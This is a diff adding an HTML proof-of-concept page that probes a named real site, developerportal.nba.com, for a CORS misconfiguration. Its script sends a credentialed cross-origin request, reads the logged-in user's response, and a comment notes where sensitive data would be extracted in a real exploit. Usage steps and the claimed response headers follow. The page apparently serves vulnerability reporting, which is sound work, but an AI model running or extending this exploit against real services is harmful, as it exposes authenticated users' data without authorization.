@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>NBA Developer Portal CORS Test</title>
+</head>
+<body>
+    <h1>NBA Developer Portal CORS Test</h1>
+    <p>This page tests for CORS misconfiguration on developerportal.nba.com</p>
+    <p>The developer portal allows credentials from http://127.0.0.1:3000, which we're simulating here.</p>
+    
+    <button onclick="testCORS()">Test CORS</button>
+    
+    <div id="result" style="margin-top: 20px; padding: 10px; border: 1px solid #ccc;"></div>
+    
+    <script>
+        function testCORS() {
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = "Testing CORS...";
+            
+            // Create a fetch request to the developer portal with credentials
+            fetch('https://developerportal.nba.com/', {
+                method: 'GET',
+                credentials: 'include', // This is important for the CORS test
+                headers: {
+                    'Origin': 'http://127.0.0.1:3000'
+                }
+            })
+            .then(response => {
+                resultDiv.innerHTML += "<p>Response received. Status: " + response.status + "</p>";
+                return response.text();
+            })
+            .then(data => {
+                // Only show the first 200 characters to avoid overwhelming the display
+                const preview = data.substring(0, 200) + "...";
+                resultDiv.innerHTML += "<p>Response data preview:</p><pre>" + preview + "</pre>";
+                
+                // Look for interesting headers
+                resultDiv.innerHTML += "<p>Checking if CORS headers were properly applied...</p>";
+                
+                // In a real exploit, we would extract sensitive information here
+                resultDiv.innerHTML += "<p>This demonstrates that the site may be vulnerable to CORS attacks if a user is authenticated.</p>";
+            })
+            .catch(error => {
+                resultDiv.innerHTML += "<p>Error: " + error.message + "</p>";
+                resultDiv.innerHTML += "<p>This could indicate that CORS protections are working or that there are other issues.</p>";
+            });
+        }
+    </script>
+    
+    <h2>How to Use This Test</h2>
+    <ol>
+        <li>Run this page on http://127.0.0.1:3000 (use a local server)</li>
+        <li>Log in to the NBA Developer Portal in another tab</li>
+        <li>Return to this page and click "Test CORS"</li>
+        <li>If the request succeeds, it demonstrates a CORS vulnerability</li>
+    </ol>
+    
+    <h2>Explanation</h2>
+    <p>The NBA Developer Portal has the following CORS headers:</p>
+    <pre>
+Access-Control-Allow-Origin: http://127.0.0.1:3000
+Access-Control-Allow-Credentials: true
+    </pre>
+    <p>This configuration allows requests from localhost:3000 to include credentials (cookies), which could potentially be exploited in a CORS attack if a developer can be tricked into visiting a malicious site while logged in.</p>
+</body>
+</html> 
